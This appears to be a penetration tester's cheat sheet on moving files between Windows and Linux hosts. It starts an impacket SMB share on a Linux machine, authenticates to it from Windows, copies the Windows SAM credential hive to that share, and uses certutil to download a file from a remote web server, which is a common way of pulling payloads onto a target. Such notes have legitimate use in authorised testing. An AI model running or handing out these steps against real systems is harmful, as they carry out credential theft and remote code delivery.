# File Transfers

# Windows to Linux

Open share on linux device
```bash
impacket-smbserver -smb2support -user $un -password $pw SHARE /tmp/share
```

Authenticate to share on windows device
```powershell
net use \\$linux_ip\SHARE /user:$un $pw
```

Send file to linux device
```powershell
copy "C:/Users/bart/Downloads/SAM" \\$linux_ip\SHARE\SAM
```

# Linux to Windows

grab with certutil
```powershell
certutil.exe -f -urlcache http://$ip/$file $file
```